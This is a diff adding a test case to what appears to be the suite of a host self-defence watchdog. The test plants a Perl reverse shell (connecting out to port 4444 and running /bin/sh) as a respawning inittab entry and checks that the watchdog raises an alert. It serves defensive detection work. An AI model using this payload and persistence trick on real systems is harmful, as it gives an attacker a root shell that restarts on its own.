@@ -294,3 +294,18 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on inittab respawn surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp inittab respawn
+    # rev-shell variants already locked. Perl is on every Debian/
+    # Ubuntu host as dpkg/locale dependency. Locks perl axis on
+    # T1037 inittab boot-time-respawn root-exec persistence — the
+    # respawn action makes the listener self-healing across kill
+    # attempts.
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\npl:5:respawn:perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${INITTAB}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
